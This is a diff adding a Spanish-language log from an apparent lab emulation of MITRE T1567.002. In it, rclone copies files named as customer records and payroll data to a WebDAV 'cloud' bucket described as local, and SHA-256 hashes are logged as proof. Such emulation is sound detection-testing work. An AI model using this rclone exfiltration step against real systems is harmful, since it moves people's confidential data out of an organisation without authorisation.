@@ -1,0 +1,22 @@
+ATA049 · T1567.002 Exfiltration to Cloud Storage (WebDAV local) — ART adaptado
+T0=2026-10-02T01:37:35Z
+--- rclone copy exfil/ -> cloud:bucket/ ---
+2026/10/02 03:37:35 INFO  : clientes_2026.csv: Copied (new)
+2026/10/02 03:37:35 INFO  : nominas.csv: Copied (new)
+2026/10/02 03:37:35 INFO  : notas.txt: Copied (new)
+2026/10/02 03:37:35 INFO  : 
+Transferred:   	        199 B / 199 B, 100%, 0 B/s, ETA -
+Checks:                 0 / 0, -, Listed 3
+Transferred:            3 / 3, 100%
+Elapsed time:         0.1s
+
+rclone_rc=0
+--- sha256 local de lo exfiltrado (prueba de efecto) ---
+bc8bf1dc600bdd8ced2786fd61bb69788fde6f639a538681fbd9f1a4c0a32a51  /home/angel/lab-attack/ATA049/exfil/clientes_2026.csv
+3a2ec5e23f32f1203db558707d582e0dc377f8737b6bb0318a1d6104b5692073  /home/angel/lab-attack/ATA049/exfil/nominas.csv
+04c33e33949e30230bd5b4064185db3d4a99f37f2f0dfa7f5b5b50c6a419f4d4  /home/angel/lab-attack/ATA049/exfil/notas.txt
+--- procesos rclone residuales ---
+0
+EXFIL_CLOUD=OK (rclone subio exfil/ al WebDAV local)
+T1_LOCAL=2026-10-02T01:37:36Z
+attack_rc=0
